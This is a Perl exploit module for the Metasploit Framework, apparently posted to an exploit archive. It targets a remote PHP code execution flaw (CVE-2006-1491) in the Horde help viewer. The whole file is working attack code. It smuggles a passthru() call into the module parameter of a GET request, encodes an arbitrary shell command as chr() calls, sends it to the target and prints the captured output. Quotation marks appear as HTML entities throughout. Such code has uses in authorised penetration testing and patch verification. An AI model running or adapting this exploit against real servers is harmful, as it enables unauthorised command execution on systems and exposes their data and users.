Horde <= 3.0.9, 3.1.0 (Help Viewer) Remote Code Execution (metasploit)
======================================================================




##
#        Title: Horde <= 3.0.9, 3.1.0 (Help Viewer) Remote PHP Code Execution Vulnerability
#    Name: horde_help_module.pm
# License: Artistic/BSD/GPL
#         Info: Trying to get the command execution exploits out of the way on milw0rm.com. M&#039;s are always good.
#
#
#  - This is an exploit module for the Metasploit Framework, please see
#     http://metasploit.com/projects/Framework for more information.
#
## Coded by Inkubus <inkubus@inbox.lv>

package Msf::Exploit::horde_help_module;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	&#039;Name&#039;     => &#039;Horde help viewer module remote PHP code execution&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.0 $&#039;,
	&#039;Authors&#039;  => [ &#039;inkubus < inkubus [at] inbox.lv >&#039; ],
	&#039;Arch&#039;     => [ ],
	&#039;OS&#039;       => [ ],
	&#039;Priv&#039;     => 0,
	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
		&#039;VHOST&#039; => [0, &#039;DATA&#039;, &#039;The virtual host name of the server&#039;],
		&#039;RPATH&#039; => [1, &#039;DATA&#039;, &#039;Path to the Horde help module&#039;, &#039;/horde/services/help/&#039;],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Description&#039; => Pex::Text::Freeform(qq{
			This module exploits an arbitrary PHP code execution flaw in the Horde web
		Horde versions 3.0 up to 3.0.9 and 3.1.0 are vulnerable.
}),

	&#039;Refs&#039; =>
	  [
		[&#039;OSVDB&#039;, &#039;15945&#039;],
		[&#039;CVE&#039;,   &#039;2006-1491&#039;],
	  ],

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039; => 512,
		&#039;Keys&#039;  => [&#039;cmd&#039;, &#039;cmd_bash&#039;],
	  },

	&#039;Keys&#039; => [&#039;horde&#039;],

	&#039;DisclosureDate&#039; => &#039;Mar 28 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar(&#039;RHOST&#039;);
	my $target_port    = $self->GetVar(&#039;RPORT&#039;);
	my $vhost          = $self->GetVar(&#039;VHOST&#039;) || $target_host;
	my $path           = $self->GetVar(&#039;RPATH&#039;);
	my $cmd            = $self->GetVar(&#039;EncodedPayload&#039;)->RawPayload;

	# Add an echo on each end for easy output capturing
	$cmd = "echo _cmd_beg_;".$cmd.";echo _cmd_end_";

	# Encode the command as a set of chr() function calls
	my $byte = join(&#039;.&#039;, map { $_ = &#039;chr(&#039;.$_.&#039;)&#039; } unpack(&#039;C*&#039;, $cmd));

	# Create the get request data
	#my $data = "?do=page&template={\${passthru($byte)}}";
	my $data = "?show=about&module=;\".passthru($byte);&#039;.";

	my $req =
	  "GET $path$data HTTP/1.1\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Content-Type: application/html\r\n".
	  "Content-Length: ". length($data)."\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );

	if ($s->IsError){
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending the malicious Horde request...");

	$s->Send($req);

	my $results = $s->Recv(-1, 20);
	$s->Close();

	if ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {
		my $out = $1;
		$out =~ s/^\s+|\s+$//gs;
		if ($out) {
			$self->PrintLine(&#039;----------------------------------------&#039;);
			$self->PrintLine(&#039;&#039;);
			$self->PrintLine($out);
			$self->PrintLine(&#039;&#039;);
			$self->PrintLine(&#039;----------------------------------------&#039;);
		}
	}
	return;
}

1;




